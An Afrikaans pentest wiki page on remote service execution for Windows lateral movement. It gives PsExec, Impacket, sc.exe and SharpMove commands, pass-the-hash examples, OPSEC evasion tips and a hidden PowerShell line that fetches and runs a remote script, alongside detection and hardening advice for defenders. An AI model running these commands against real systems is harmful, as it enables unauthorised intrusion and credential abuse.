# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Hoe werk hulle

Hierdie tegnieke misbruik die Windows Service Control Manager (SCM) op afstand oor SMB/RPC om opdragte op ’n teiken gasheer uit te voer. Die Service Control Manager Remote Protocol (SCMR) is die RPC-gebaseerde koppelvlak waarmee Windows-dienste op ’n afgeleë rekenaar gekonfigureer en beheer word. Met voldoende toestemmings kan ’n operateur ’n diens skep of herkonfigureer waarvan die binêre pad ’n opdrag bevat, en dan daardie diens begin om die opdrag op afstand uit te voer.<sup>[[5]](#references)</sup> Die algemene vloei is:

1. Meld aan by die teiken oor SMB/RPC (TCP/445); kry toegang tot die ADMIN$-deel wanneer die gekose variant ’n lêer daar moet plaas of uitvoer daaruit moet haal.
2. Kopieer ’n uitvoerbare lêer of spesifiseer ’n LOLBAS-opdragreël wat die diens sal uitvoer.
3. Skep ’n diens op afstand via SCM (MS-SCMR oor \PIPE\svcctl) wat na daardie opdrag of binêre lêer wys.
4. Begin die diens om die payload uit te voer en vang opsioneel stdin/stdout via ’n named pipe vas.
5. Stop die diens en maak skoon (verwyder die diens en enige neergelêde binêre lêers).

Vereistes/voorvereistes:
- Plaaslike Administrator op die teiken (SeCreateServicePrivilege) of uitdruklike diensskeppingsregte op die teiken.
- SMB (445) moet bereikbaar wees en Remote Service Management moet deur die gasheer se firewall toegelaat word; ADMIN$ moet beskikbaar wees vir variante wat dit gebruik om ’n lêer daar te plaas of uitvoer daaruit te haal.
- UAC Remote Restrictions: met plaaslike rekeninge kan token filtering admin-toegang oor die netwerk blokkeer, tensy die ingeboude Administrator of LocalAccountTokenFilterPolicy=1 gebruik word.
- Kerberos teenoor NTLM: die gebruik van ’n gasheernaam/FQDN maak Kerberos moontlik; ’n verbinding via IP val dikwels terug na NTLM (en kan in versterkte omgewings geblokkeer word).

As geen diensrekening gespesifiseer word nie, gebruik `CreateService` `LocalSystem`, wat uitgebreide plaaslike voorregte het. Dit verklaar die groot impak van suksesvolle SCM-uitvoering. Dit skakel UAC of Microsoft Defender nie vanself af nie: die oproeper benodig steeds SCM-regte op afstand, en eindpuntbeheer kan die diens of payload inspekteer of blokkeer.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### Handmatige ScExec/WinExec via sc.exe

Die volgende wys ’n minimale benadering om ’n diens te skep. Die diensbeeld kan ’n neergelêde EXE of ’n LOLBAS soos cmd.exe of powershell.exe wees.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes:
- Verwag 'n time-outfout wanneer 'n nie-diens-EXE begin word; uitvoering vind steeds plaas.
- Om meer OPSEC-vriendelik te bly, verkies fileless-opdragte (cmd /c, powershell -enc) of verwyder afgelaaide artefakte.

Vind meer gedetailleerde stappe by: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Nutsmiddels en voorbeelde

### Sysinternals PsExec.exe

- Klassieke admin-nutsmiddel wat SMB gebruik om PSEXESVC.exe in ADMIN$ te plaas, 'n tydelike diens te installeer (versteknaam PSEXESVC) en I/O oor benoemde pype te stuur.
- Voorbeelde van gebruik:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Jy kan dit direk vanaf Sysinternals Live via WebDAV loods:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Laat installering-/verwyderingsgebeurtenisse vir dienste agter (diensnaam is dikwels PSEXESVC, tensy -r gebruik word) en skep C:\Windows\PSEXESVC.exe tydens uitvoering.

### Impacket psexec.py (PsExec-like)

- Gebruik ’n ingebedde RemCom-like diens. Plaas ’n tydelike diensbinêre lêer (dikwels met ’n ewekansige naam) via ADMIN$, skep ’n diens (standaard dikwels RemComSvc) en stuur I/O deur ’n named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Op Kali is die Impacket-voorbeelde moontlik onder `/usr/share/doc/python3-impacket/examples/` geleë. As geen wagwoord verskaf word nie, vra die instrument daarvoor. Impacket se `-k` versoek Kerberos-verifikasie in plaas van NTLM en gebruik gewoonlik die huidige geloofsbronnakas of verskafde geloofsbriewe.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefakte
- Tydelike EXE in C:\Windows\ (ewekansige 8 karakters). Diensnaam is standaard RemComSvc, tensy dit oorskryf word.

### Impacket smbexec.py (SMBExec)

- Skep ’n tydelike diens wat cmd.exe begin en ’n named pipe vir I/O gebruik. Vermy gewoonlik die los van ’n volledige EXE-payload; opdraguitvoering is semi-interaktief.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementeer verskeie lateral movement-metodes, insluitend diensgebaseerde exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) ondersteun geoutentiseerde afstanduitvoering via SCM en verskeie ander Windows-meganismes, insluitend dienswysiging/-skepping.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Jy kan ook CrackMapExec gebruik om via verskillende backends uit te voer (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

Die SCM-aksie skep ’n diens met die naam `WindowsDebug` en wys dit na ’n payload wat reeds op die afgeleë gasheer teenwoordig is.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, opsporing en artefakte

Tipiese gasheer-/netwerkartefakte wanneer PsExec-agtige tegnieke gebruik word:
- Security 4624 (Logon Type 3) en 4672 (Special Privileges) op die teiken vir die admin-rekening wat gebruik is.
- Security 5140/5145 File Share- en File Share Detailed-gebeurtenisse wat ADMIN$-toegang en die skep/skryf van diensbinêre lêers (bv. PSEXESVC.exe of ’n ewekansige 8-karakter .exe) toon.
- **System** 7045 van Service Control Manager vir diensinstallasie op die teiken: name soos PSEXESVC, RemComSvc of pasgemaakte name (`-r` / `-service-name`). Dit bewys dat ’n diens geïnstalleer is, nie dat die beeld daarvan uitgevoer is nie. Korrelleer die tydstempel en beeldpad met prosesgebeurtenisse of ’n ooreenstemmende diensbeeld-prefetch-inskrywing, indien beskikbaar.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) vir services.exe of die diensbeeld, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) vir pype soos \\.\pipe\psexesvc, \\.\pipe\remcom_* of gerandomiseerde ekwivalente.
- Registerartefak vir Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 op die operateurgasheer (indien dit nie onderdruk is nie).

Jag-idees
- Waarsku oor diensinstallasies waar ImagePath cmd.exe /c, powershell.exe of TEMP-liggings insluit.
- Soek na prosesskeppings waar ParentImage C:\Windows\PSEXESVC.exe is, of na kinders van services.exe wat as LOCAL SYSTEM-doppe uitvoer.
- Merk benoemde pype wat eindig met -stdin/-stdout/-stderr of bekende PsExec-kloonpypname.

## Algemene probleme oplos
- Toegang geweier (5) wanneer dienste geskep word: nie werklik ’n plaaslike admin nie, UAC-afgeleëbeperkings vir plaaslike rekeninge, of EDR-peuterbeskerming op die diensbinêre lêerpad.
- Die netwerkpad is nie gevind nie (53), of kon nie aan ADMIN$ koppel nie: ’n firewall blokkeer SMB/RPC, of administratiewe delings is gedeaktiveer.
- Kerberos misluk, maar NTLM word geblokkeer: koppel met die gasheernaam/FQDN (nie IP nie), maak seker die SPN’s is korrek, of verskaf -k/-no-pass met kaartjies wanneer Impacket gebruik word.
- Diensbegin loop uit, maar die loonvrag het uitgevoer: verwag indien dit nie ’n werklike diensbinêre lêer is nie; neem uitvoer na ’n lêer vas of gebruik smbexec vir lewendige I/O.

## Verhardingsnotas
- Windows 11 24H2 en Windows Server 2025 vereis by verstek SMB-ondertekening vir uitgaande (en Windows 11 se inkomende) verbindings. Dit breek nie wettige PsExec-gebruik met geldige geloofsbriewe nie, maar voorkom misbruik van ongetekende SMB-relay en kan toestelle raak wat nie ondertekening ondersteun nie.<sup>[[2]](#references)</sup>
- Die nuwe SMB-kliëntblokkering van NTLM (Windows 11 24H2/Server 2025) kan NTLM-terugval voorkom wanneer daar met ’n IP-adres of aan nie-Kerberos-bedieners gekoppel word. In verharde omgewings sal dit NTLM-gebaseerde PsExec/SMBExec breek; gebruik Kerberos (gasheernaam/FQDN) of stel uitsonderings op indien dit wettiglik nodig is.<sup>[[2]](#references)</sup>
- Beginsel van minste voorreg: beperk lidmaatskap van plaaslike administrateurs, verkies Just-in-Time/Just-Enough Admin, dwing LAPS af en monitor/waarsku oor 7045-diensinstallasies.

## Sien ook

- WMI-gebaseerde afgeleë uitvoering (dikwels meer lêerloos):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-gebaseerde afgeleë uitvoering:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB-sekuriteitsverharding in Windows Server 2025 en Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Gebruik geloofsbriewe om Windows-rekenaars oor te neem - Deel 2 (PSExec en dienste)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Foutspoor onverwagte herbegin met behulp van stelselgebeurtenislogboeke](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Oorsig van die Service Control Manager-afgeleëprotokol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - LocalSystem-rekening](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - `CreateService`-funksie](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
